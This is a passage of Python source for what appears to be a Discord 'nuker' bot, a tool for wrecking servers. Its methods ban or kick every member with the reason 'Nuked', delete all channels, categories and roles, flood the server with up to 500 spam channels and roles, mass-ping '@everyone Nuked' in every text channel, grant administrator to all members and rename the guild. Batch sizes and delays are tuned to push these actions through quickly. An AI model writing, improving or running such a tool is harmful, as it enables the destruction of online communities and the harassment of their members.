                    if progress_callback:
                        progress_callback(completed, total)
                    results.extend([r for r in batch_results if not isinstance(r, Exception)])
                    if i + batch_size < total:
                        await asyncio.sleep(delay)
                return results
            
            await batch_with_progress(tasks, Config.BATCH_SIZE_BAN_KICK, Config.DELAY_DEFAULT, "ban_all_members")
        else:
            await self._batch_process(tasks, batch_size=Config.BATCH_SIZE_BAN_KICK, delay=Config.DELAY_DEFAULT, operation_name="ban_all_members")
        
        # Optimized string formatting - pre-compute values
        banned_count = self.stats['banned']
        padding = ' ' * (35 - len(str(banned_count)))
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.GREEN}{Style.BRIGHT}  [+] Successfully Banned: {banned_count} Members{Fore.CYAN}{padding}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
    
    async def kick_all_members(self, guild: discord.Guild, reason: str = "Nuked", progress_callback: Optional[Callable[[int, int], None]] = None) -> None:
        """Kick all members from a guild (optimized for maximum speed)
        
        Kicks all members from the specified guild, excluding the bot itself and members
        with higher roles. For large guilds (5000+ members), uses chunked processing
        to avoid memory issues.
        
        Args:
            guild: The Discord guild to kick members from
            reason: Reason for the kick (default: "Nuked")
            progress_callback: Optional callback function(current, total) for progress updates
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks kick permissions
            discord.HTTPException: If API request fails
        
        Example:
            ```python
            async def progress(current, total):
                print(f"Kicked {current}/{total} members")
            
            await nuker.kick_all_members(guild, reason="Inactive", progress_callback=progress)
            ```
        
        Performance:
            - Batch size: 30 members per batch
            - Delay: 0.05s between batches
            - For large guilds: Processes in chunks of 1000 members
        """
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  [*] Starting Kick Operation...{Fore.CYAN}{' ' * 37}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        
        # Memory management for large guilds (5000+ members)
        if guild.member_count > 5000:
            logger.info(f"Large guild detected ({guild.member_count} members), using chunked processing")
            await self._process_large_guild_operation(guild, "kick", reason)
            return
        
        # Use cached members immediately - chunking is slow and not necessary
        # Discord automatically caches members when members intent is enabled
        members_cached = len(guild.members)
        print(f"{Fore.CYAN}[*] Using cached members: {members_cached} members{Style.RESET_ALL}")
        
        # Only try to fetch more members if we have very few cached (just bot itself)
        # Use a very short timeout (5 seconds) to avoid blocking
        if members_cached <= 1:
            print(f"{Fore.CYAN}[*] Attempting to fetch members (5 second timeout)...{Style.RESET_ALL}")
            try:
                await asyncio.wait_for(guild.chunk(), timeout=5.0)
                members_after = len(guild.members)
                if members_after > members_cached:
                    print(f"{Fore.GREEN}[+] Fetched {members_after} members{Style.RESET_ALL}\n")
                else:
                    print(f"{Fore.YELLOW}[*] No additional members fetched, using cached: {members_after}{Style.RESET_ALL}\n")
            except (asyncio.TimeoutError, Exception) as e:
                print(f"{Fore.YELLOW}[*] Using cached members: {len(guild.members)} members{Style.RESET_ALL}")
                if members_cached <= 1:
                    print(f"{Fore.YELLOW}[!] Make sure 'Server Members Intent' is enabled in Discord Developer Portal{Style.RESET_ALL}\n")
                else:
                    print()  # Just newline
                logger.warning(f"Could not fetch additional members: {e}. Using cached members.")
        else:
            print()  # Just newline for spacing
        
        # Filter members once - cache bot info for speed
        bot_id = self.bot.user.id
        bot_top_role = guild.me.top_role
        # Use list comprehension with early filtering for speed
        members_to_kick = [
            m for m in guild.members 
            if m.id != bot_id and m.top_role <= bot_top_role
        ]
        
        if not members_to_kick:
            print(f"{Fore.YELLOW}[*] No members to kick{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Total members in cache: {len(guild.members)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Bot ID: {bot_id}{Style.RESET_ALL}")
            if len(guild.members) == 1:
                print(f"{Fore.YELLOW}[*] Only bot itself is in the member cache. Make sure members intent is enabled in Discord Developer Portal.{Style.RESET_ALL}\n")
            else:
                print(f"{Fore.YELLOW}[*] All members may have higher roles than the bot.{Style.RESET_ALL}\n")
            return
        
        base_endpoint = f"guilds/{guild.id}/members"
        tasks = []
        for member in members_to_kick:
            async def kick_member(m):
                result = await self.safe_execute(
                    guild.kick(m, reason=reason),
                    endpoint=f"{base_endpoint}/{m.id}",
                    operation_type=OperationType.KICK
                )
                if result is not False:
                    self._increment_stat('kicked')
            
            tasks.append(kick_member(member))
        
        # Use generic batch processor with progress callback support
        total_members = len(members_to_kick)
        if progress_callback:
            # Wrap batch processor to call progress callback
            async def batch_with_progress(tasks, batch_size, delay, operation_name):
                results = []
                total = len(tasks)
                completed = 0
                for i in range(0, total, batch_size):
                    batch = tasks[i:i + batch_size]
                    batch_results = await asyncio.gather(*batch, return_exceptions=True)
                    completed += len([r for r in batch_results if not isinstance(r, Exception)])
                    if progress_callback:
                        progress_callback(completed, total)
                    results.extend([r for r in batch_results if not isinstance(r, Exception)])
                    if i + batch_size < total:
                        await asyncio.sleep(delay)
                return results
            
            await batch_with_progress(tasks, Config.BATCH_SIZE_BAN_KICK, Config.DELAY_DEFAULT, "kick_all_members")
        else:
            await self._batch_process(tasks, batch_size=Config.BATCH_SIZE_BAN_KICK, delay=Config.DELAY_DEFAULT, operation_name="kick_all_members")
        
        # Optimized string formatting - pre-compute values
        kicked_count = self.stats['kicked']
        padding = ' ' * (35 - len(str(kicked_count)))
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.GREEN}{Style.BRIGHT}  [+] Successfully Kicked: {kicked_count} Members{Fore.CYAN}{padding}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
    
    async def prune_members(self, guild: discord.Guild, days: int = 7) -> int:
        """Prune (kick) members who have been inactive for specified days
        
        Discord's prune feature removes members who haven't been active for
        the specified number of days. This is useful for cleaning up inactive
        members from the server.
        
        Args:
            guild: The Discord guild to prune members from
            days: Number of days of inactivity required for pruning (default: 7)
                  Must be between 1 and 30
        
        Returns:
            Number of members that would be pruned (estimate)
        
        Raises:
            discord.Forbidden: If bot lacks kick_members permission
            discord.HTTPException: If API request fails
            ValueError: If days is not between 1 and 30
        """
        print(f"{Fore.YELLOW}[*] Pruning members...")
        result = await self.safe_execute(
            guild.prune_members(days=days, reason="Prune"),
            endpoint=f"guilds/{guild.id}/prune",
            operation_type=OperationType.PRUNE
        )
        if result:
            print(f"{Fore.GREEN}[+] Pruned members")
    
    async def mass_nickname(self, guild: discord.Guild, nickname: Optional[str] = None) -> None:
        """Change nickname for all members in the guild
        
        Sets the same nickname for all members. If no nickname is provided,
        a random nickname is generated. The bot itself is excluded from
        nickname changes.
        
        Args:
            guild: The Discord guild containing the members
            nickname: The nickname to set for all members. If None, a random
                     nickname will be generated
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks manage_nicknames permission
            discord.HTTPException: If API request fails
        """
        print(f"{Fore.YELLOW}[*] Changing nicknames...")
        
        if nickname is None:
            nickname = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        # Filter out bot
        bot_id = self.bot.user.id
        members_to_nick = [m for m in guild.members if m.id != bot_id]
        
        if not members_to_nick:
            print(f"{Fore.YELLOW}[*] No members to nickname{Style.RESET_ALL}")
            return
        
        base_endpoint = f"guilds/{guild.id}/members"
        tasks = []
        for member in members_to_nick:
            async def change_nick(m, nick):
                result = await self.safe_execute(
                    m.edit(nick=nick),
                    endpoint=f"{base_endpoint}/{m.id}",
                    operation_type=OperationType.NICKNAME
                )
                if result is not False:
                    print(f"{Fore.GREEN}[+] Changed nickname for {m}")
            
            tasks.append(change_nick(member, nickname))
        
        # Use generic batch processor
        await self._batch_process(tasks, batch_size=Config.BATCH_SIZE_NICKNAME, delay=Config.DELAY_DEFAULT, operation_name="mass_nickname")
    
    async def grant_admin_all(self, guild: discord.Guild) -> None:
        """Grant administrator role to all members in the guild
        
        Creates a new role with all permissions and assigns it to all members.
        This operation is performed concurrently for better performance.
        
        Args:
            guild: The Discord guild to grant admin permissions in
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks manage_roles permission
            discord.HTTPException: If API request fails
        """
        print(f"{Fore.YELLOW}[*] Granting admin...")
        try:
            admin_role = await self.safe_execute(
                guild.create_role(name="Admin", permissions=discord.Permissions.all(), reason="Admin"),
                endpoint=f"guilds/{guild.id}/roles",
                operation_type=OperationType.GRANT_ADMIN
            )
            
            if admin_role:
                tasks = []
                for member in guild.members:
                    async def add_admin(m, role):
                        await self.safe_execute(
                            m.add_roles(role),
                            endpoint=f"guilds/{guild.id}/members/{m.id}/roles/{role.id}",
                            operation_type=OperationType.GRANT_ADMIN
                        )
                    
                    tasks.append(add_admin(member, admin_role))
                
                await asyncio.gather(*tasks, return_exceptions=True)
                print(f"{Fore.GREEN}[+] Granted admin to all members")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    async def unban_all_members(self, guild: discord.Guild) -> None:
        """Unban all previously banned members from the guild
        
        Fetches the ban list and attempts to unban each user. This operation
        is performed concurrently for better performance.
        
        Args:
            guild: The Discord guild to unban members from
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks ban_members permission
            discord.HTTPException: If API request fails
        """
        print(f"{Fore.YELLOW}[*] Unbanning all...")
        try:
            bans = [entry async for entry in guild.bans()]
            tasks = []
            for ban_entry in bans:
                async def unban(entry):
                    result = await self.safe_execute(
                        guild.unban(entry.user),
                        endpoint=f"guilds/{guild.id}/bans/{entry.user.id}",
                        operation_type=OperationType.UNBAN
                    )
                    if result is not False:
                        print(f"{Fore.GREEN}[+] Unbanned {entry.user}")
                
                tasks.append(unban(ban_entry))
            
            await asyncio.gather(*tasks, return_exceptions=True)
            print(f"{Fore.GREEN}[+] Unbanned {len(bans)} members")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    async def unban_member(self, guild: discord.Guild, user_id: int) -> None:
        """Unban a specific member by user ID
        
        Args:
            guild: The Discord guild to unban the member from
            user_id: The Discord user ID to unban
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks ban_members permission
            discord.HTTPException: If API request fails or user not found
            discord.NotFound: If the user is not banned
        """
        try:
            user = await self.bot.fetch_user(user_id)
            result = await self.safe_execute(
                guild.unban(user),
                endpoint=f"guilds/{guild.id}/bans/{user_id}",
                operation_type=OperationType.UNBAN
            )
            if result is not False:
                print(f"{Fore.GREEN}[+] Unbanned {user}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    async def mass_assign_role(self, guild: discord.Guild, role: discord.Role) -> None:
        """Assign a role to all members in the guild
        
        This operation is performed concurrently for all members to improve
        performance. The bot itself is excluded from role assignment.
        
        Args:
            guild: The Discord guild containing the members
            role: The role to assign to all members
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks manage_roles permission or role hierarchy is invalid
            discord.HTTPException: If API request fails
        """
        print(f"{Fore.YELLOW}[*] Assigning role to all members...")
        tasks = []
        for member in guild.members:
            async def assign_role(m, r):
                result = await self.safe_execute(
                    m.add_roles(r),
                    endpoint=f"guilds/{guild.id}/members/{m.id}/roles/{r.id}",
                    operation_type=OperationType.ASSIGN_ROLE
                )
                if result is not False:
                    print(f"{Fore.GREEN}[+] Assigned role to {m}")
            
            tasks.append(assign_role(member, role))
        
        # Use generic batch processor
        await self._batch_process(tasks, batch_size=20, delay=0.05, operation_name="mass_assign_role")
    
    async def remove_role_from_all(self, guild: discord.Guild, role: discord.Role) -> None:
        """Remove a role from all members who have it
        
        This operation is performed concurrently for all members to improve
        performance. Only members who currently have the role are affected.
        
        Args:
            guild: The Discord guild containing the members
            role: The role to remove from all members
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks manage_roles permission or role hierarchy is invalid
            discord.HTTPException: If API request fails
        """
        print(f"{Fore.YELLOW}[*] Removing role from all members...")
        tasks = []
        for member in guild.members:
            if role in member.roles:
                async def remove_role(m, r):
                    result = await self.safe_execute(
                        m.remove_roles(r),
                        endpoint=f"guilds/{guild.id}/members/{m.id}/roles/{r.id}",
                        operation_type=OperationType.REMOVE_ROLE
                    )
                    if result is not False:
                        print(f"{Fore.GREEN}[+] Removed role from {m}")
                
                tasks.append(remove_role(member, role))
        
        # Use generic batch processor
        await self._batch_process(tasks, batch_size=20, delay=0.05, operation_name="mass_assign_role")
    
    # ==================== CHANNEL MANAGEMENT ====================
    
    async def delete_channels(self, guild: discord.Guild, progress_callback: Optional[Callable[[int, int], None]] = None) -> None:
        """Delete all channels"""
        # Validate operation prerequisites
        if not await self._validate_operation(guild, "manage_channels", "delete channels"):
            return
        
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  [*] Starting Channel Deletion...{Fore.CYAN}{' ' * 36}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        tasks = []
        for channel in guild.channels:
            async def delete_channel(ch):
                result = await self.safe_execute(
                    ch.delete(),
                    endpoint=f"channels/{ch.id}",
                    operation_type=OperationType.DELETE_CHANNEL
                )
                if result is not False:
                    self._increment_stat('channels_deleted')
                    print(f"{Fore.GREEN}[+] Deleted {ch.name}")
            
            tasks.append(delete_channel(channel))
        
        # Use generic batch processor with progress callback support
        if progress_callback:
            async def batch_with_progress(tasks, batch_size, delay, operation_name):
                results = []
                total = len(tasks)
                completed = 0
                for i in range(0, total, batch_size):
                    batch = tasks[i:i + batch_size]
                    batch_results = await asyncio.gather(*batch, return_exceptions=True)
                    completed += len([r for r in batch_results if not isinstance(r, Exception)])
                    if progress_callback:
                        progress_callback(completed, total)
                    results.extend([r for r in batch_results if not isinstance(r, Exception)])
                    if i + batch_size < total:
                        await asyncio.sleep(Config.DELAY_DEFAULT)
                return results
            
            await batch_with_progress(tasks, Config.BATCH_SIZE_CHANNELS, Config.DELAY_DEFAULT, "delete_channels")
        else:
            await self._batch_process(tasks, batch_size=Config.BATCH_SIZE_CHANNELS, delay=Config.DELAY_DEFAULT, operation_name="delete_channels")
        
        print(f"\n{Fore.CYAN}{'═'*70}")
        # Optimized string formatting
        deleted_count = self.stats['channels_deleted']
        padding = ' ' * (33 - len(str(deleted_count)))
        print(f"{Fore.CYAN}║{Fore.GREEN}{Style.BRIGHT}  [+] Successfully Deleted: {deleted_count} Channels{Fore.CYAN}{padding}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
    
    async def create_channels(self, guild: discord.Guild, count: int = 50, name: Optional[str] = None, progress_callback: Optional[Callable[[int, int], None]] = None) -> None:
        """Create multiple channels (optimized)
        
        Args:
            guild: The Discord guild to create channels in
            count: Number of channels to create (default: 50)
            name: Base name for channels (default: random string)
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks channel creation permissions
            discord.HTTPException: If API request fails
        """
        # Validate operation prerequisites
        if not await self._validate_operation(guild, "manage_channels", "create channels"):
            return
        
        # Validate count
        count = self.validate_count(count, min_value=1, max_value=500, param_name="channel count")
        
        print(f"\n{Fore.CYAN}{'═'*70}")
        print(f"{Fore.CYAN}║{Fore.YELLOW}{Style.BRIGHT}  [*] Creating {count} Channels...{Fore.CYAN}{' ' * (40 - len(str(count)))}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
        
        if name is None:
            name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        else:
            # Validate and sanitize channel name
            name = self.validate_channel_name(name)
            if not name:
                name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        endpoint = f"guilds/{guild.id}/channels"
        tasks = []
        for i in range(count):
            async def create_channel(idx):
                channel_name = f"{name}-{idx}"
                # Ensure channel name is valid
                channel_name = self.validate_channel_name(channel_name) or f"channel-{idx}"
                result = await self.safe_execute(
                    guild.create_text_channel(channel_name),
                    endpoint=endpoint,
                    operation_type=OperationType.CREATE_CHANNEL
                )
                if result:
                    self._increment_stat('channels_created')
                return result
            
            tasks.append(create_channel(i))
        
        # Use generic batch processor with progress callback support
        if progress_callback:
            # Wrap batch processor to call progress callback
            async def batch_with_progress(tasks, batch_size, delay, operation_name):
                results = []
                total = len(tasks)
                completed = 0
                for i in range(0, total, batch_size):
                    batch = tasks[i:i + batch_size]
                    batch_results = await asyncio.gather(*batch, return_exceptions=True)
                    completed += len([r for r in batch_results if not isinstance(r, Exception)])
                    if progress_callback:
                        progress_callback(completed, total)
                    results.extend([r for r in batch_results if not isinstance(r, Exception)])
                    if i + batch_size < total:
                        await asyncio.sleep(delay)
                return results
            
            await batch_with_progress(tasks, Config.BATCH_SIZE_CHANNELS, Config.DELAY_DEFAULT, "create_channels")
        else:
            await self._batch_process(tasks, batch_size=Config.BATCH_SIZE_CHANNELS, delay=Config.DELAY_DEFAULT, operation_name="create_channels")
        
        print(f"\n{Fore.CYAN}{'═'*70}")
        # Optimized string formatting
        created_count = self.stats['channels_created']
        padding = ' ' * (33 - len(str(created_count)))
        print(f"{Fore.CYAN}║{Fore.GREEN}{Style.BRIGHT}  [+] Successfully Created: {created_count} Channels{Fore.CYAN}{padding}║")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}\n")
    
    async def rename_channels(self, guild: discord.Guild, name: Optional[str] = None) -> None:
        """Rename all channels (optimized)"""
        print(f"{Fore.YELLOW}[*] Renaming channels...")
        
        if name is None:
            name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        else:
            # Validate and sanitize channel name
            name = self.validate_channel_name(name)
            if not name:
                name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        channels = list(guild.channels)
        if not channels:
            print(f"{Fore.YELLOW}[*] No channels to rename{Style.RESET_ALL}")
            return
        
        tasks = []
        for i, channel in enumerate(channels):
            async def rename_channel(ch, idx):
                result = await self.safe_execute(
                    ch.edit(name=f"{name}-{idx}"),
                    endpoint=f"channels/{ch.id}",
                    operation_type=OperationType.RENAME_CHANNEL
                )
                if result is not False:
                    print(f"{Fore.GREEN}[+] Renamed {ch.name}")
            
            tasks.append(rename_channel(channel, i))
        
        # Use generic batch processor with proper rate limit delays for channel operations
        await self._batch_process(tasks, batch_size=Config.BATCH_SIZE_CHANNELS, delay=Config.DELAY_DEFAULT, operation_name="rename_channels")
    
    async def shuffle_channels(self, guild: discord.Guild) -> None:
        """Randomly shuffle the positions of all channels in the guild
        
        This operation randomly reorders all channels (text, voice, category)
        to new positions. The operation is performed concurrently for better
        performance.
        
        Args:
            guild: The Discord guild to shuffle channels in
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks manage_channels permission
            discord.HTTPException: If API request fails
        """
        print(f"{Fore.YELLOW}[*] Shuffling channels...")
        channels = list(guild.channels)
        random.shuffle(channels)
        
        tasks = []
        for i, channel in enumerate(channels):
            async def move_channel(ch, pos):
                await self.safe_execute(
                    ch.edit(position=pos),
                    endpoint=f"channels/{ch.id}",
                    operation_type=OperationType.SHUFFLE_CHANNEL
                )
            
            tasks.append(move_channel(channel, i))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{Fore.GREEN}[+] Shuffled channels")
    
    async def mass_ping(self, guild: discord.Guild, message: str = "@everyone Nuked", count: int = 5, progress_callback: Optional[Callable[[int, int], None]] = None) -> None:
        """Mass ping in all channels (optimized)"""
        # Validate operation prerequisites
        if not await self._validate_operation(guild, "send_messages", "mass ping"):
            return
        
        # Validate and sanitize message content
        message = self.validate_message_content(message) or "@everyone Nuked"
        
        # Validate count
        count = self.validate_count(count, min_value=1, max_value=100, param_name="ping count")
        
        print(f"{Fore.YELLOW}[*] Mass pinging...")
        
        text_channels = guild.text_channels
        if not text_channels:
            print(f"{Fore.YELLOW}[*] No text channels found{Style.RESET_ALL}")
            return
        
        tasks = []
        for channel in text_channels:
            async def ping_channel(ch):
                endpoint = f"channels/{ch.id}/messages"
                for _ in range(count):
                    result = await self.safe_execute(
                        ch.send(message),
                        endpoint=endpoint,
                        operation_type=OperationType.MASS_PING
                    )
                    if result:
                        self._increment_stat('messages_sent')
                await asyncio.sleep(Config.DELAY_MINIMAL)
            
            tasks.append(ping_channel(channel))
        
        # Use generic batch processor with progress callback support
        if progress_callback:
            async def batch_with_progress(tasks, batch_size, delay, operation_name):
                results = []
                total = len(tasks)
                completed = 0
                for i in range(0, total, batch_size):
                    batch = tasks[i:i + batch_size]
                    batch_results = await asyncio.gather(*batch, return_exceptions=True)
                    completed += len([r for r in batch_results if not isinstance(r, Exception)])
                    if progress_callback:
                        progress_callback(completed, total)
                    results.extend([r for r in batch_results if not isinstance(r, Exception)])
                    if i + batch_size < total:
                        await asyncio.sleep(delay)
                return results
            
            await batch_with_progress(tasks, Config.BATCH_SIZE_MASS_PING, Config.DELAY_SHORT, "mass_ping")
        else:
            await self._batch_process(tasks, batch_size=Config.BATCH_SIZE_MASS_PING, delay=Config.DELAY_SHORT, operation_name="mass_ping")
        
        print(f"{Fore.GREEN}[+] Sent {self.stats['messages_sent']} messages")
    
    async def create_categories(self, guild: discord.Guild, count: int = 10, name: Optional[str] = None) -> None:
        """Create channel categories"""
        print(f"{Fore.YELLOW}[*] Creating categories...")
        if name is None:
            name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        tasks = []
        for i in range(count):
            async def create_category(idx):
                result = await self.safe_execute(
                    guild.create_category(f"{name}-{idx}"),
                    endpoint=f"guilds/{guild.id}/channels",
                    operation_type=OperationType.CREATE_CATEGORY
                )
                return result
            
            tasks.append(create_category(i))
        
        # Use generic batch processor
        await self._batch_process(tasks, batch_size=Config.BATCH_SIZE_CHANNELS, delay=Config.DELAY_DEFAULT, operation_name="create_categories")
        print(f"{Fore.GREEN}[+] Created {count} categories")
    
    async def delete_categories(self, guild: discord.Guild) -> None:
        """Delete all category channels in the guild
        
        Removes all category channels from the guild. This operation is
        performed concurrently for better performance.
        
        Args:
            guild: The Discord guild to delete categories from
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks manage_channels permission
            discord.HTTPException: If API request fails
        """
        print(f"{Fore.YELLOW}[*] Deleting categories...")
        tasks = []
        for category in guild.categories:
            async def delete_category(cat):
                result = await self.safe_execute(
                    cat.delete(),
                    endpoint=f"channels/{cat.id}",
                    operation_type=OperationType.DELETE_CATEGORY
                )
                if result is not False:
                    print(f"{Fore.GREEN}[+] Deleted category {cat.name}")
            
            tasks.append(delete_category(category))
        
        await asyncio.gather(*tasks, return_exceptions=True)
    
    async def shuffle_categories(self, guild: discord.Guild) -> None:
        """Shuffle category positions"""
        print(f"{Fore.YELLOW}[*] Shuffling categories...")
        categories = list(guild.categories)
        random.shuffle(categories)
        
        tasks = []
        for i, category in enumerate(categories):
            async def move_category(cat, pos):
                await self.safe_execute(
                    cat.edit(position=pos),
                    endpoint=f"channels/{cat.id}",
                    operation_type=OperationType.SHUFFLE_CHANNEL
                )
            
            tasks.append(move_category(category, i))
        
        await asyncio.gather(*tasks, return_exceptions=True)
        print(f"{Fore.GREEN}[+] Shuffled categories")
    
    # ==================== ROLE MANAGEMENT ====================
    
    async def create_roles(self, guild: discord.Guild, count: int = 50, name: Optional[str] = None, progress_callback: Optional[Callable[[int, int], None]] = None) -> None:
        """Create multiple roles (optimized)"""
        print(f"{Fore.YELLOW}[*] Creating {count} roles...")
        
        if name is None:
            name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        endpoint = f"guilds/{guild.id}/roles"
        tasks = []
        for i in range(count):
            async def create_role(idx):
                result = await self.safe_execute(
                    guild.create_role(name=f"{name}-{idx}"),
                    endpoint=endpoint,
                    operation_type=OperationType.CREATE_ROLE
                )
                if result:
                    self._increment_stat('roles_created')
                return result
            
            tasks.append(create_role(i))
        
        # Use generic batch processor with progress callback support
        if progress_callback:
            # Wrap batch processor to call progress callback
            async def batch_with_progress(tasks, batch_size, delay, operation_name):
                results = []
                total = len(tasks)
                completed = 0
                for i in range(0, total, batch_size):
                    batch = tasks[i:i + batch_size]
                    batch_results = await asyncio.gather(*batch, return_exceptions=True)
                    completed += len([r for r in batch_results if not isinstance(r, Exception)])
                    if progress_callback:
                        progress_callback(completed, total)
                    results.extend([r for r in batch_results if not isinstance(r, Exception)])
                    if i + batch_size < total:
                        await asyncio.sleep(delay)
                return results
            
            await batch_with_progress(tasks, Config.BATCH_SIZE_ROLES, Config.DELAY_ROLE_OPS, "create_roles")
        else:
            await self._batch_process(tasks, batch_size=Config.BATCH_SIZE_ROLES, delay=Config.DELAY_ROLE_OPS, operation_name="create_roles")
        
        print(f"{Fore.GREEN}[+] Created {self.stats['roles_created']} roles")
    
    async def delete_roles(self, guild: discord.Guild, progress_callback: Optional[Callable[[int, int], None]] = None) -> None:
        """Delete all roles"""
        print(f"{Fore.YELLOW}[*] Deleting all roles...")
        tasks = []
        for role in guild.roles:
            if role.id == guild.id:
                continue
            
            async def delete_role(r):
                # Use common endpoint for all role operations - Discord rate limits are per bucket
                result = await self.safe_execute(
                    r.delete(),
                    endpoint=f"guilds/{guild.id}/roles",  # Common endpoint for rate limit tracking
                    operation_type=OperationType.DELETE_ROLE
                )
                if result is not False:
                    self._increment_stat('roles_deleted')
                    print(f"{Fore.GREEN}[+] Deleted {r.name}")
            
            tasks.append(delete_role(role))
        
        # Use generic batch processor with progress callback support
        if progress_callback:
            async def batch_with_progress(tasks, batch_size, delay, operation_name):
                results = []
                total = len(tasks)
                completed = 0
                for i in range(0, total, batch_size):
                    batch = tasks[i:i + batch_size]
                    batch_results = await asyncio.gather(*batch, return_exceptions=True)
                    completed += len([r for r in batch_results if not isinstance(r, Exception)])
                    if progress_callback:
                        progress_callback(completed, total)
                    results.extend([r for r in batch_results if not isinstance(r, Exception)])
                    if i + batch_size < total:
                        await asyncio.sleep(Config.DELAY_DEFAULT)
                return results
            
            await batch_with_progress(tasks, Config.BATCH_SIZE_ROLES, Config.DELAY_ROLE_OPS, "delete_roles")
        else:
            await self._batch_process(tasks, batch_size=Config.BATCH_SIZE_ROLES, delay=Config.DELAY_ROLE_OPS, operation_name="delete_roles")
        
        print(f"{Fore.GREEN}[+] Deleted {self.stats['roles_deleted']} roles")
    
    async def rename_roles(self, guild: discord.Guild, name: Optional[str] = None) -> None:
        """Rename all roles (optimized)"""
        print(f"{Fore.YELLOW}[*] Renaming roles...")
        
        if name is None:
            name = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        # Filter out @everyone role
        guild_id = guild.id
        roles_to_rename = [r for r in guild.roles if r.id != guild_id]
        
        if not roles_to_rename:
            print(f"{Fore.YELLOW}[*] No roles to rename{Style.RESET_ALL}")
            return
        
        base_endpoint = f"guilds/{guild.id}/roles"
        tasks = []
        for i, role in enumerate(roles_to_rename):
            async def rename_role(r, idx):
                # Use common endpoint for all role operations - Discord rate limits are per bucket
                result = await self.safe_execute(
                    r.edit(name=f"{name}-{idx}"),
                    endpoint=base_endpoint,  # Common endpoint for rate limit tracking
                    operation_type=OperationType.RENAME_ROLE
                )
                if result is not False:
                    print(f"{Fore.GREEN}[+] Renamed {r.name}")
            
            tasks.append(rename_role(role, i))
        
        # Use generic batch processor with proper rate limit delays
        await self._batch_process(tasks, batch_size=Config.BATCH_SIZE_ROLES, delay=Config.DELAY_ROLE_OPS, operation_name="rename_roles")
    
    async def copy_role_permissions(self, guild: discord.Guild, source_role: discord.Role, target_role: discord.Role) -> None:
        """Copy permissions from one role to another"""
        try:
            await self.safe_execute(
                target_role.edit(permissions=source_role.permissions),
                endpoint=f"guilds/{guild.id}/roles/{target_role.id}"
            )
            print(f"{Fore.GREEN}[+] Copied permissions from {source_role.name} to {target_role.name}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    # ==================== GUILD MANAGEMENT ====================
    
    async def rename_guild(self, guild: discord.Guild, name: Optional[str] = None) -> None:
        """Rename the guild (server)
        
        Changes the name of the Discord server. If no name is provided,
        a random name is generated.
        
        Args:
            guild: The Discord guild to rename
            name: New name for the guild. If None, a random name is generated
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks manage_guild permission
            discord.HTTPException: If API request fails
        """
        if name is None:
            name = ''.join(random.choices(string.ascii_letters + string.digits, k=15))
        
        result = await self.safe_execute(
            guild.edit(name=name),
            endpoint=f"guilds/{guild.id}",
            operation_type=OperationType.RENAME_GUILD
        )
        if result is not False:
            print(f"{Fore.GREEN}[+] Renamed guild to {name}")
    
    async def modify_verification_level(self, guild: discord.Guild, level: discord.VerificationLevel) -> None:
        """Modify the guild's verification level
        
        Changes the verification level required for members to send messages
        in the server. Higher levels require more verification.
        
        Args:
            guild: The Discord guild to modify
            level: The new verification level (none, low, medium, high, very_high)
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks manage_guild permission
            discord.HTTPException: If API request fails
        """
        try:
            await self.safe_execute(
                guild.edit(verification_level=level),
                endpoint=f"guilds/{guild.id}"
            )
            print(f"{Fore.GREEN}[+] Changed verification level")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
    
    async def change_afk_timeout(self, guild: discord.Guild, timeout: int) -> None:
        """Change the AFK (Away From Keyboard) timeout for the guild
        
        Sets the time in seconds before members are moved to the AFK channel.
        Valid values are typically 60, 300, 900, 1800, or 3600 seconds.
        
        Args:
            guild: The Discord guild to modify
            timeout: AFK timeout in seconds (60, 300, 900, 1800, or 3600)
        
        Returns:
            None
        
        Raises:
            discord.Forbidden: If bot lacks manage_guild permission
            discord.HTTPException: If API request fails or timeout value is invalid
        """
        try:
            await self.safe_execute(
                guild.edit(afk_timeout=timeout),
                endpoint=f"guilds/{guild.id}"
            )
            print(f"{Fore.GREEN}[+] Changed AFK timeout to {timeout}")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
